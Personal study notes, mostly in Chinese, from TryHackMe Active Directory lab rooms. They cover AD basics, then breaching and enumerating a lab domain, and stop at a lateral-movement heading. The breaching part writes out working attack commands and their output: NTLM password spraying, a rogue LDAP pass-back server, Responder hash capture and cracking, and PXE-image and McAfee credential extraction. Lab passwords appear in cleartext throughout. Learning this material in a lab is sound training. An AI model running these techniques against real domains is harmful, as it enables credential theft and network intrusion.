# Active Directory ( AD ) 
	--> 網域控制站 ( DC ) 
		--> 安全群組
		--> 組織單位 (OU) 
		--> 委派 (delegate)
	--> 群組原則物件 ( GPO )
		--> Default Domain Controllers
		--> Default Domain Policy
	--> 認證
		--> Kerberos
			--> 金鑰分發中心 (KDC)
			--> 票證授予票證 ( TGT )
			--> krbtgt
		--> NetNTLM
			--> NTLM密碼雜湊
## Active Directory Basics :  
	--> AD 簡化了企業環境中設備和使用者的管理
	
	--> Windows 網域(Windows Domains)
		--> Active Directory ( AD )的儲存庫
		--> Domain Controller (網域控制站)  : 執行 Active Directory 服務的伺服器
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> Active Directory Domain Service (AD DS)
		--> 充當目錄，保存網路上存在的所有「物件」的資訊
		--> users, groups, machines, printers, shares and many others
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> security principals : 
			--> Users 
				--> People : 需要存取網路的人員
				--> Services : 定義供 IIS 或 MSSQL 等服務使用的使用者
			--> Machines
				--> : 機器帳戶密碼會自動輪換，通常由 120 個隨機字元組成
			--> Security Groups
				--> 可以將使用者新增至現有群組，並且他們將自動繼承該群組的所有權限
				-->  both users and machines as members
				--> https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups
				
				=> Domain Admins 	: 擁有整個網域的管理權限 | 管理網域中的任何計算機，包括 DC
				=> Server Operators	: 可以管理網域控制器 | 無法變更任何管理群組成員資格
				=> Backup Operators	: 可以存取任何文件，但忽略其權限
				=> Account Operators	: 可以建立或修改網域中的其他帳戶
				=> Domain Users		: 包括網域中所有現有的使用者帳戶
				=> Domain Computers	: 包括域中的所有現有電腦。
				=> Domain Controllers	: 包括域中所有現有的 DC
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
		--> Active Directory Users and Computers
			-->  Organizational Units 組織單位 (OU) 進行組織
				--> 定義具有相似監管要求的使用者群組
				
			--> containers : 
				--> Builtin : Managed Service Accounts
				--> Computers : 任何加入網路的電腦
				--> Domain Controllers : 網路中 DC 的預設OU 
				--> Users : 網域範圍上下文的預設使用者和群組
				--> Managed Service Accounts : 儲存 Windows 網域中的服務所使用的帳戶
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
		--> Security Groups vs OUs
			--> OU可以輕鬆地 將政策應用於使用者和計算機
			--> Security Groups用於授予對資源的權限
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> Managing Users in AD
		--> Deleting extra OUs and users
			=> 預設情況下，OU 受到保護，不會被意外刪除
			=> 要刪除OU，我們需要啟用「視圖」功能表中的「進階功能」 
				--> view => Advanced Deatures
				--> choose ou => right click => Properties => Object
					=> unclick [protect object from accidential deletion]
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> Delegation :
			=> 為特定使用者提供某些 OU 的一定控制權
			=> 允許您授予使用者特定權限以在 OU 上執行高級任務，而無需網域管理員介入
			--> e.g  IT support : 重置其他低權限使用者密碼的權限\
			
			--> choose ou => right click => Delegate Control 
			--> Add => Check Names --Windows 將自動為您補全使用者  => ok 
			--> Tasks to Delegate -- Reset user passeord ... => Next 
			
		--> rdp :  username: THM\phillip --  specify  user : phillip on the domain :THM 
			--> CMD --> Powershell
		--> 密碼重設 : 
			--> Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
		--> 下次登入時強制重設密碼 :
			--> Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
				-> THM\sophie : cOaire2008
		
		-->  move Computers : 
			--> Workstations : 每個使用者都可能登入工作站
			--> Servers : 為使用者或其他伺服器
			--> Domain Controllers
			--> thm.local => right click => new => OU ==> move unit to OU 
			--> 每個OU單獨部署不同的策略
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> Group Policy Management (GPM)	
		--> Group Policy Objects (GPO)
			--> Scope : 
				--> Link : 即 GPO 在AD中連結的位置
				--> Security Filtering  : 
			--> Setting : 讓我們知道它所應用的具體配置
				
		--> Default Domain Policy 
			--> 讓我們更改最小密碼長度策略，要求使用者的密碼至少包含 10 個字元
			--> right click => Edit  
				=> Computer Configurations => Policies => Windows Setting
				=> Security Settings =>  Account Policies =>  Password Policy
				=> Minimum password length : 10 characters
					 
		--> GPO distribution : 
			--> SYSVOL : 儲存在DC中的網路共用分發到網路
			--> C:\Windows\SYSVOL\sysvol\我們網路中每個 DC 上的目錄
				
			--> 強制任何特定電腦立即同步其 GPO
				=> PS C:\> gpupdate /force
					
		--> 為THM Inc.創建一些 GPO : 
			--> 限制對控制面板的訪問 :
				--> New GPO :  Restrict Control Panel Access
				
				--> 特定用戶 : 
				 	--> User Configuration : Control Panel 
				  		=> Prohibit access to Contral Panel and PC settings -- Enable
				  --> 透過將GPO拖曳到每個組織來連結OU： Marketing、Management、Sales
				  
			--> 不活動 5 分鐘後自動鎖定螢幕
				--> New GPO : Auto Lock Screen
				
				--> 鎖定螢幕 :
					=> Computer Configurations
					--> Security Settings =>  Local Policies => Security options
						=> Interactive logon : Machine inactivity limit 300 seconds
				--> 將 GPO 拖曳到根網域，將其連結到根網域
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~			
	--> Authentication Methods :
		--> Kerberos : 任何最新版本的 Windows 
			--> 密碼派生的金鑰加密的使用者名稱和時間戳記發送到金鑰分發中心 (KDC)
			--> 安裝在網域控制站DC -- 建立Kerberos票證
			--> KDC 將建立並發回票證授予票證 ( TGT )
			--> 提供會話金鑰，他們將需要該會話金鑰來產生以下請求
			
			--> TGT使用krbtgt帳戶的密碼雜湊進行加密
			
			--> 想要連接到網路上的服務 使用TGT向 KDC 請求票證授予服務 (TGS)
			--> TGS 是只允許連接到為其創建的特定服務的票證
			--> TGT和服務主體名稱 (SPN)
			
			=> KDC 將向我們發送 TGS 以及服務會話金鑰
			
			--> TGS 使用從 服務擁有者雜湊派生的金鑰進行加密
			--> 將 TGS 發送到所需的服務以進行身份驗證並建立連線
			--> 該服務將使用其配置的帳戶的密碼雜湊來解密 TGS 並驗證服務會話金鑰
			
			
		--> NetNTLM  : 出於相容性目的而保留的舊身份驗證協定
			--> 客戶端向他們想要存取的伺服器發送身份驗證請求
			--> 伺服器產生一個隨機數字並將其作為質詢傳送給客戶端
			--> 客戶端將其NTLM密碼雜湊與質詢（和其他已知資料）結合起來 -- NTLM hash 
				--> 產生對質詢的回應，並將其發送回伺服器進行驗證
			--> 伺服器將質詢和回應轉發給網域控制器進行驗證
			--> 網域控制器 DC 使用質詢重新計算回應並將其與客戶端發送的原始回應進行比較
				--> 如果兩者匹配，則用戶端通過身份驗證；否則，訪問將被拒絕。認證結果發送回伺服器
			---> 伺服器將認證結果轉送給客戶端
			--> 為了安全起見，用戶的密碼（或雜湊值）永遠不會透過網路傳輸
## Breaching Active Directory
	--> 利用AD錯誤配置進行權限提升
	--> my ip : 10.50.53.41
	--> Kerberos 依賴DNS來建立票證
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> work :  https://0xfk.github.io/offensive-security/docs/Active-Directory/THM.AD.Breach.html
	
		--> sudo systemctl restart NetworkManager
	--> test : 
		--> nslookup thmdc.za.tryhackme.com 
		
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	初始存取權限 : 
		--> DNS :
			=> 將主機名稱解析為 IP
		--> 設定DNS :
			=> systemd-resolve --interface breachad --set-dns 10.200.55.101 --set-domain za.tryhackme.com
		--> 測試DNS是否正常運作：nslookup thmdc.za.tryhackme.com
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> Error : 
		--> 將驗證網路是否處於活動狀態 : ping 10.200.55.101 
			=> 再次啟動網路
		--> DNS伺服器是否處於活動狀態 : nslookup tryhackme.com 10.200.55.101 
			=> 網路重置
		--> DNS配置 : cat /etc/resolv.conf
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> 開源情報 (OSINT) 
		--> 公共論壇 : https://stackoverflow.com/
		--> Github :　https://github.com/
		--> 外部網站： 
			--> https://haveibeenpwned.com/
			--> https://www.dehashed.com/
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> 網路釣魚
		--> 後台安裝遠端存取特洛伊木馬 (RAT)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	NTLM認證服務
		--> NetNTLM 的基於質詢-回應的方案進行驗證
		--> 也稱為 Windows 驗證或NTLM驗證
		--> 該憑證應僅儲存在網域控制器(DC)
		--> 暴露:
			--> 公開 Outlook Web App (OWA) 登入入口網站的內部託管 Exchange（郵件）伺服器
			--> 遠端桌面協定（RDP ）服務
			--> 與AD整合的公開VPN端點
			--> 面向互聯網並使用 NetNTLM 的 Web 應用程式
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> 暴力登入攻擊
			=> AD 都配置了帳戶鎖定
			=> 密碼噴射攻擊 
				--> 使用一個密碼「Changeme123」所有使用者名稱進行身份驗證
				
			--> hydra :
				=> hydra -I -V -L ./usernames.txt -p 'Changeme123' ntlmauth.za.tryhackme.com http-get '/:A=NTLM:F=401'
				login: gordon.stevens   password: Changeme123                                        
				login: heather.smith   password: Changeme123                                         
				login: hollie.powell   password: Changeme123                                         
				login: georgina.edwards   password: Changeme123  
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
			--> python :
				=> python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
				[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	LDAP 綁定憑證
		--> 輕量級目錄存取協定 (LDAP) 身份驗證
		--> Gitlab | Jenkins | Custom-developed web applications | Printers |VPNs 
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> LDAP 回傳攻擊(LDAP Pass-back Attack)
			--> 針對網路裝置（例如印表機）的常見攻擊
			--> 預設憑證（網路印表機的 Web 介面）
				=> admin:admin
				=> admin:password
			--> http://printer.za.tryhackme.com/settings.aspx
				=> Server : 10.50.53.41
		--> LDAP的預設連接埠是389	
			--> nc -lvnp 389
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> 託管惡意 LDAP 伺服器
			--> error 
				--> W: GPG error: http://th.archive.ubuntu.com/ubuntu jammy InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 871920D1991BC93C
			--> solution :
				--> sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 871920D1991BC93C
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--> OpenLDAP :
				=> sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
			--> 重新配置 LDAP 伺服器 : sudo dpkg-reconfigure -p low slapd
				=> DNS domain name : za.tryhackme.com
				=> Organization name: za.tryhackme.com
				=> Administrator password 
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--> 降級支援的身份驗證機制
				--> nano olcSaslSecProps.ldif
					dn: cn=config
					replace: olcSaslSecProps
					olcSaslSecProps: noanonymous,minssf=0,passcred
					
					=> olcSaslSecProps：指定 SASL 安全性屬性
					=> noanonymous：停用支援匿名登入的機制
					=> minssf：指定可接受的最小安全強度，0表示無保護。
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--> 使用 ldif 檔案來修補我們的 LDAP 伺服器 :
				--> sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
					SASL/EXTERNAL authentication started
					SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
					SASL SSF: 0
					modifying entry "cn=config"
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
			--> 驗證我們的惡意 LDAP 伺服器的設定是否已套用 :
				--> ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechan
					dn:
					supportedSASLMechanisms: LOGIN
					supportedSASLMechanisms: PLAIN
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
			--> 擷取 LDAP 憑證
				--> sudo tcpdump -SX -i breachad tcp port 389
					za.tryhackme.com\svc 
					LDAP..tryhackmeldappass1@

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	認證中繼(Authentication Relays)
		--> https://tryhackme.com/r/room/hololive
		--> SMB使用的 NetNTLM 身份驗證
		--> 伺服器訊息區塊 (SMB) 協定允許客戶端（如工作站）與伺服器（如檔案共用）進行通訊
		--> 1. 用離線破解技術來恢復與NTLM Challenge相關的密碼。
		--> 2. 惡意裝置發動中間人攻擊

		--> Responder 
			--> 使用 Responder 嘗試攔截 NetNTLM 挑戰來破解它
			--> Responder 允許我們透過在 NetNTLM 驗證期間毒害回應來執行中間人攻擊
			--> 嘗試毒害偵測到的任何連結本地多播名稱解析 (LLMNR)
				NetBIOS 名稱服務 (NBT-NS) 
				Web 代理程式自動發現 (WPAD) 要求
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		攔截 NetNTLM 挑戰
			--> git clone https://github.com/lgandx/Responder.git
				--> sudo python3 Responder.py -I breachad
				--> fix 
					--> sudo lsof -i tcp:389 -s tcp:listen
					--> sudo lsof -i tcp:389 -s tcp:listen
			--> sudo python3 Responder.py -I breachad
				[+] Listening for events...  (wait 10 min)

			[SMB] NTLMv2-SSP Client   : 10.200.55.202
			[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
			[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:..
					
			--> 破解雜湊	
				--> john --wordlist=passwordlist-1647876320267.txt N_hash.txt
				--> hashcat -m 5600 N_hash.txt passwordlist-1647876320267.txt --force
				
				=> FPassword1!      (svcFileCopy)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	微軟部署工具包 (Microsoft Deployment Toolkit)
		--> Microsoft 部署工具包 (MDT)
		--> MDT 與 Microsoft 的系統中心組態管理器 (SCCM) 集成
			=> MDT : 在中央位置維護和更新基礎映像
			=> SCCM : 管理Microsoft 應用程式、服務和作業系統的所有更新
		--> 預啟動執行環境 (PXE) 
			=> 連接到網路的新裝置直接透過網路連線載入和安裝作業系統
			=> PXE 啟動通常與 DHCP 集成
			
			--> 1. 注入權限升級向量
			--> 2. 執行密碼抓取攻擊以恢復安裝期間使用的AD憑證\
			
			--> https://github.com/wavestone-cdt/powerpxe
			--> WIM 檔案是 Windows 映像格式 (WIM) 的可啟動映像
			--> TFTP 從 MDT 伺服器恢復檔案
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		--> PXE 啟動映像檢索
			=> 使用 TFTP 請求每個 BCD 檔案並列舉所有檔案的配置
			=> x64{7C1F8215-68C1-46C8-994D-7CD11B19D57C}.bcd
			
			--> ssh thm@THMJMP1.za.tryhackme.com | Password1@

		--> 建立資料夾	
			C:\Users\THM>cd Documents
			C:\Users\THM\Documents> mkdir 0XFK
			C:\Users\THM\Documents> copy C:\powerpxe 0XFK\
				C:\powerpxe\LICENSE
				C:\powerpxe\PowerPXE.ps1
				C:\powerpxe\README.md
			C:\Users\THM\Documents\> cd 0XFK
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
		--> 使用 TFTP 並下載 BCD 檔案來讀取 MDT 伺服器的設定
			\0XFK> tftp -i 10.200.55.202 GET "\Tmp\x64{7C1F8215-68C1-46C8-994D-7CD11B19D57C}.bcd" conf.bcd
			C: \0XFK> powershell -executionpolicy bypass
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
			PS \0XFK> Import-Module .\PowerPXE.ps1
			PS \0XFK> $BCDFile = "conf.bcd"
			PS \0XFK> Get-WimFile -bcdFile $BCDFile
				>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
			PS \0XFK> tftp -i 10.200.55.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
			PS \0XFK> Get-FindCredentials -WimFile .\pxeboot.wim	
				>> Open pxeboot.wim
				>>>> Finding Bootstrap.ini
				>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
				>>>> >>>> UserID = svcMDT
				>>>> >>>> UserDomain = ZA
				>>>> >>>> UserPassword = PXEBootSecure1@

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	設定檔
		--> 嘗試恢復AD憑證的絕佳探索途徑
		--> https://github.com/GhostPack/Seatbelt
		--> McAfee 將安裝期間用於連接回 Orchestrator 的憑證嵌入名為 ma.db 的檔案中
			--> scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
		--> 打開資料庫 : sqlitebrowser ma.db
			--> Browse Date 
				=> table : AGENT_REPOSITORIES
				=> DOMAIN : za.tryhackme.com
				=> AUTH_USER : svcAV
				=> AUTH_PASSWD : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
		--> decrtpy :
			--> https://github.com/funoverip/mcafee-sitelist-pwd-decryption
			--> python3 mcafee_sitelist_pwd_decrypt.py 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
				=> Decrypted password : MyStrongPassword!

## Enumerating Active Directory
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> http://distributor.za.tryhackme.com/creds
		=> Username: mandy.bryan Password: Dbrnjhbz1986
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		--> SSH :
			=> ssh za.tryhackme.com\\mandy.bryan@thmjmp1.za.tryhackme.com
		--> RDP : 
			=> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.200.58.248 /u:mandy.bryan /p:'Dbrnjhbz1986'
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 Credential Injection : 
	 	--> runas.exe : 將憑證注入到記憶體中
	 		=> runas.exe /netonly /user:<domain>\<username> cmd.exe
	 		=> runas.exe /netonly /user:za.tryhackme.com\mandy.bryan cmd.exe
	 			--> /netonly 希望載入網路驗證的憑證
	 	--> 自己的 Windows 計算機 管理員身份執行第一個命令提示字元
	 		--> 將管理員令牌注入到 CMD 中
	 	--> 驗證我們的憑證是否有效
	 		--> 列出 SYSVOL
	 		
	 	--> 設定DNS
	 		--> 有時內部DNS會透過 DHCP 或 VPN 連線自動為您配置
	 		
	 		--> 手動執行此 -- PowerShell
				$dnsip = "10.200.58.101"
				$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
				Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip	 
		--> 驗證DNS是否正常運作
			--> nslookup za.tryhackme.com		
		--> 測試我們的憑證		
			--> C:\Tools>dir \\za.tryhackme.com\SYSVOL\	
				
		--> dir \\za.tryhackme.com\SYSVOL
			=> 執行 Kerberos 驗證
		--> dir \\<DC IP>\SYSVOL	
			=> NTLM
						
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 Microsoft Management Console (GUI 的方法)
	 	--> Microsoft 管理控制台 (MMC) 
		--> 遠端伺服器管理工具(RSAT) AD 管理單元
		--> Windows VM (THMJMP1)
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> download RSAT 
			按 Start
			搜尋  "Apps & Features" 並按 Enter 鍵
			按一下管理選用功能(Manage Optional Features)
			點選新增功能( Add a feature)
			搜尋“RSAT”
			選擇“ RSAT：Active Directory 網域服務和輕量級目錄工具”，然後按一下“安裝”
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		--> start => rum => mmc 
			Click File -> Add/Remove Snap-in
			Select and Add all three Active Directory Snap-ins
			Click through any errors and warnings
			
			Right-click on Active Directory Domains and Trusts and select Change Forest
			Enter za.tryhackme.com as the Root domain and Click OK

			Right-click on Active Directory Sites and Services and select Change Forest
			Enter za.tryhackme.com as the Root domain and Click OK

			Right-click on Active Directory Users and Computers and select Change Domain
			Enter za.tryhackme.com as the Domain and Click OK

			Right-click on Active Directory Users and Computers in the left-hand pane
			Click on View -> Advanced Features
			
			-->  expand the za domain 
				=> admin
				=> people
				=> servers
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 命令提示字元
	 	--> net 
	 		=> 列舉有關本地系統和AD的資訊的便捷工具
	 		=> net user /domain
	 			=> 返回所有AD用戶
	 		=> net user zoe.marshall /domain
	 			=> 列舉有關單一使用者帳戶的更詳細資訊
	 		=> net group /domain
	 			=> 枚舉網域的群組
	 		=> net group "Tier 1 Admins" /domain
	 			=> 指定群組列舉更多詳細信息，例如群組的成員身份
	 		=> net accounts /domain
	 			=> 列舉網域的密碼原則
	 		--> https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 PowerShell
	 	--> Get-ADUser | 列舉AD用戶
	 		=> Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *
	 			=> -Identity - 我們正在列舉的帳號名
	 			=> -Properties * 將顯示所有屬性
	 			=> -Server - 指向我們的網域控制器
	 		=> Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com 
	 			| Format-Table Name,SamAccountName -A
	 			=> -Filter - 進行更多控制的參數
	 			=> Format-Table - 整齊地顯示結果
	 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
	 	--> Get-ADGroup : 列舉AD組
	 		=> Get-ADGroup -Identity Administrators -Server za.tryhackme.com
	 			=> SID | ObjectGUID
	 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 	--> Get-ADGroupMember : 列舉群組成員資格
	 		=> distinguishedName
	 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 	--> Get-ADObject : 搜尋AD物件執行
	 		--> 尋找在特定日期之後更改的所有AD物件
	 		=> $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
	 		=> Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
	 		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 		--> 在不鎖定帳戶的情況下執行密碼噴射攻擊
	 		--> 列舉 badPwdCount 大於 0 的帳戶
	 		=>  Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
	 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 	--> Get-ADDomain : 檢索有關特定域的附加資訊
	 		-->  Get-ADDomain -Server za.tryhackme.com
	 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 	--> Set-ADAccountPassword
	 		--> 強制更改AD用戶的密碼
	 		--> Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com 
	 			-OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) 
	 			-NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> task 
		Get-ADUser -Identity beth.nolan -Server za.tryhackme.com -Properties * 
		Get-ADUser -Identity annette.manning -Server za.tryhackme.com -Properties *
		Get-ADGroup -Identity "Tier 2 Admins" -Server za.tryhackme.com -Properties *
		Get-ADGroup -Identity "Enterprise Admins" -Server za.tryhackme.com -Properties *
		Get-ADDomain -Server za.tryhackme.com
 		Set-ADAccountPassword -Identity mandy.bryan -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "Dbrnjhbz1986" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "Dbrnjhbz1111" -Force)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 Sharphound是Bloodhound的列舉工具
	 	=> Sharphound 用於列舉 AD 訊息
	 	=> Bloodhound 直觀地顯示這些訊息
		 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		--> Bloodhound
		 	--> https://github.com/BloodHoundAD/BloodHound
		 	--> Bloodhound 是一個 GUI，允許我們匯入 Sharphound 捕獲的資料並將其視覺化到攻擊路徑中

		 	
		 --> Sharphound 
		 	--> https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html	
			--> Sharphound.ps1 -用於執行 Sharphound 的PowerShell腳本
				--> 適合與 RAT 一起使用，因為腳本可以直接載入到記憶體中，從而逃避磁碟上的AV掃描。
			--> Sharphound.exe - 用於執行 Sharphound 的 Windows 可執行版本。
			--> AzureHound.ps1 -雲端運算服務 執行個體的PowerShell腳本
				--> Bloodhound 可以提取從 Azure 列舉的數據，以尋找與 Azure 身分和存取管理配置相關的攻擊路徑	 	
		
		-->P.S 使用該runas命令注入 AD 憑證並將 Sharphound 指向網域控制器	

		--> cd C:\Tools\
			--> Sharphound.exe --CollectionMethods <Methods> --Domain za.tryhackme.com --ExcludeDCs	 	
				=> CollectionMethods - 確定 Sharphound 將收集哪種資料
				=> ExcludeDCs - 這將指示 Sharphound 不要接觸網域控制器
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> copy C:\Tools\Sharphound.exe ~\Documents\
		--> cd ~\Documents\
		--> SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
		--> wait => 在執行 Sharphound 的相同資料夾中獲得一個帶有時間戳記的 ZIP 檔案
			=> 20240625111251_BloodHound.zip
		--> scp mandy.bryan@THMJMP1.za.tryhackme.com:C:/Users/mandy.bryan/Documents/20240625111251_BloodHound.zip .
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> sudo apt update && sudo apt install -y bloodhound
		--> sudo neo4j console
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> bloodhound --no-sandbox
			=> neo4j 資料庫的預設憑證將為neo4j:neo4j
			--> http://localhost:7474
				change : neo4j:neo4j1
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> 將 ZIP 檔案拖曳到 Bloodhound GUI上以匯入 Bloodhound
		--> 匯入所有JSON檔案後，我們可以開始使用 Bloodhound 列舉該特定網域的攻擊路徑
			=> Database info 
				--> search node 
			=> Node info 
				--> Overview- 提供摘要信息
					=> 例如帳戶擁有的活動會話數以及是否可以達到高價值目標。
				--> Node Properties - 顯示有關AD帳戶的信息
					=> 例如顯示名稱和標題。
				--> Extra Properties - 提供更詳細的AD信息
					=> 例如可分辨名稱和建立帳戶的時間。
				--> Group Membership - 顯示帳戶所屬群組的資訊。
				--> Local Admin Rights- 提供具有管理權限的已加入網域的主機的資訊。
				--> Execution Rights - 提供有關特殊權限的信息
					=> 例如透過RDP存取電腦的能力。
				--> Outbound Control Rights- 顯示有權修改其屬性的AD物件的資訊。
				--> Inbound Control Rights- 提供可修改此帳戶屬性的AD物件的資訊。
				
			=> Analysis	
				--> Domain Information
					=> domain admin
				--> Dangerous Privileges
				--> Kerberos Interaction
					=>kerberoastable
				--> Shortest Paths
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	other : 
	--> LDAP 枚舉
		--> 任何有效的 AD 憑證對都應該能夠綁定到網域控制站的 LDAP 介面。
		--> 這將允許您編寫 LDAP 搜尋查詢來列舉有關網域中AD物件的資訊
		=> https://book.hacktricks.xyz/pentesting/pentesting-ldap
		
	--> PowerView
		--> 是PowerSploit專案的偵察腳本部分
		=> https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
		
	--> Windows Management Instrumentation ( WMI )
		--> 舉來自 Windows 主機的資訊
		--> 有一個名為“root\directory\ldap”的提供程序，可用於與 AD 互動
		=> https://0xinfection.github.io/posts/wmi-ad-enum/

## Lateral Movement and Pivoting
	--> https://tryhackme.com/r/room/lateralmovementandpivoting
	--> sudo systemctl restart NetworkManager
	--> 10.200.78.101
	--> http://distributor.za.tryhackme.com/creds
		=>  Username: damien.horton Password: pABqHYKsG8L7
	--> ip add show lateralmovement
		=> inet 10.50.77.150/
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> SSH :
			=> ssh za.tryhackme.com\\damien.horton@thmjmp2.za.tryhackme.com
				=> pABqHYKsG8L7
		--> RDP : 
			=> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.200.78.249 /u:damien.horton /p:'pABqHYKsG8L7'
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> 橫向移動
		=> 標準管理協定（例如 WinRM、RDP、VNC 或 SSH）連接到網路上的其他電腦
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> Administrators and UAC	
		=> 本機帳戶屬於本機管理員群組
		=> 網域帳戶屬於本機管理員群組
		--> 使用者帳戶控制 ( UAC )對本機管理員（預設管理員帳戶除外）施加的限制
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Psexec
